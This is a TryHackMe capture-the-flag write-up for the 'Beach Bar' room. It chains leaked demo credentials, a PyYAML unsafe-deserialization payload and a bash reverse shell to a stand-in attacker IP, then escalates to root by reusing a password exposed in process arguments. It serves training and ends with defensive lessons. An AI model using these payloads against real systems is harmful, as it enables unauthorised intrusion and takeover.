# Beach Bar - Writeup

**Room:** https://tryhackme.com/room/hh-beachbar-d849f7f7

<img width="1446" height="391" alt="image" src="https://github.com/user-attachments/assets/17c51762-a393-4ad5-88b8-f8a2cf976de2" />

## Objective
Interact with the Beach Bar guest-experience app, identify the exposed jukebox request feature, exploit the vulnerabilities chained together in the build, and capture both the user and root flags.

---

## Skills Practised
- Web Application Enumeration
- Source Code / Information Disclosure Analysis
- Unsafe YAML Deserialization (PyYAML)
- Remote Code Execution
- Linux Privilege Escalation
- Credential Reuse Exploitation

---

## Investigation Steps

### Step 1 – Read the Challenge
The briefing described a beach bar with a jukebox that "takes requests, any kind," a DJ who "never logs out," and a service "quietly announcing something." These were treated as direct hints toward the vulnerabilities present rather than flavour text.

---

### Step 2 – Recon the Target
An `nmap` full-port scan was run against the target:

```
nmap -sC -sV -p- --min-rate=1000 -T4 10.49.189.164
```

Results:

| Port | Service |
|---|---|
| 22/tcp | OpenSSH 9.6p1 (publickey only) |
| 80/tcp | gunicorn (Flask), redirects to `/login` |

The web app was a Flask/Gunicorn "DJ booth sign-in" page.

<img width="648" height="329" alt="Screenshot 2026-08-06 at 12 24 23 PM" src="https://github.com/user-attachments/assets/5fb84d8c-7319-48fc-801e-9e8c43002e9e" />

---

### Step 3 – Find the Leaked Credentials
Viewing the page source of `/login` revealed a developer comment left in production:

```html
<!--
  staff note: the demo DJ login is still enabled for the soft opening.
  dj / dj  -- swap this before the season starts (ticket BAR-7)
-->
```

This matched the "DJ who never logs out" hint. Logging in with `dj` / `dj` granted access to the dashboard.

<img width="750" height="565" alt="Screenshot 2026-08-06 at 12 10 10 PM" src="https://github.com/user-attachments/assets/ae8c892d-e8e1-4bbf-98e3-b3bb23cc3ee9" />

---

### Step 4 – Exploit the Jukebox "Any Kind of Request"
The dashboard included a playlist **Import/Export** feature ("bring a set from another night"). This matched the "jukebox takes requests, any kind" hint directly.

Testing the Import feature with a YAML payload confirmed the backend used PyYAML's unsafe loader:

```yaml
!!python/object/apply: subprocess.check_output
args: [['id']]
```

**Result:** `uid=1001(bartender) gid=1001(bartender) groups=1001(bartender)`

This was escalated to a full reverse shell:

<img width="750" height="734" alt="Screenshot 2026-08-06 at 12 16 06 PM" src="https://github.com/user-attachments/assets/44f2f4bf-1d45-4ce8-8986-2fdb2ea29da5" />

```yaml
!!python/object/apply: subprocess.check_output
args: [['bash', '-c', 'bash -i >& /dev/tcp/<attacker_ip>/4444 0>&1']]
```

An `nc -lvnp 4444` listener caught the connection, granting a shell as `bartender` and the **user flag**.

<img width="648" height="598" alt="Screenshot 2026-08-06 at 12 23 47 PM" src="https://github.com/user-attachments/assets/1e09e311-d28b-45f7-8705-84d66f4f3a55" />

---

### Step 5 – Find the "Service Down the Boardwalk"
Enumerating running processes (`ps aux`) revealed a root-owned systemd service:

```
root  612  /opt/beach-bar/venv/bin/python /opt/beach-bar/jukeboxd/jukeboxd.py --stream-pass SunsetSpritz2024! --bitrate 320k
```

This matched the "service quietly announcing something" hint — the password was exposed in plain sight via the process command-line arguments, readable through `ps`, `/proc/<pid>/cmdline`, or `systemctl status jukeboxd`.

---

### Step 6 – Privilege Escalation via Credential Reuse
The leaked password `SunsetSpritz2024!` was tested against the `root` account directly:

```
su - root
Password: SunsetSpritz2024!
```

This succeeded, granting a root shell and the **root flag**.

<img width="611" height="259" alt="Screenshot 2026-08-06 at 3 24 29 PM" src="https://github.com/user-attachments/assets/42cdcf4c-e20d-4a20-9fd9-88540dce3c5b" />

---

## What I Learned
- Client-side HTML comments are a common source of leaked internal notes and credentials.
- YAML is not a safe serialisation format for untrusted input unless loaded with a restricted/safe loader — `yaml.load()` with the default `Loader` allows arbitrary Python object instantiation.
- Process command-line arguments are visible to any local user on Linux (`ps`, `/proc/<pid>/cmdline`) and should never carry secrets.
- Password reuse between a low-trust service account and a high-privilege system account (like `root`) turns a minor leak into full compromise.
- Reading challenge flavour text carefully often maps directly onto the real vulnerabilities in the box.

---

## Tools Used
- `nmap`
- Web browser (source inspection, form interaction)
- `nc` (netcat listener for reverse shell)
- Bash / Linux enumeration commands (`ps aux`, `ss`, `find`, `systemctl status`)

---

## Key Takeaways
- Always check page source before brute-forcing or guessing credentials.
- Application-level flaws (deserialization, injection) are often the initial foothold; system-level misconfigurations (leaked secrets, credential reuse) are often the path to root.
- Never pass secrets as command-line arguments — use environment files or a secrets manager instead.
- Enforce unique credentials per account/service; reused passwords collapse privilege boundaries.
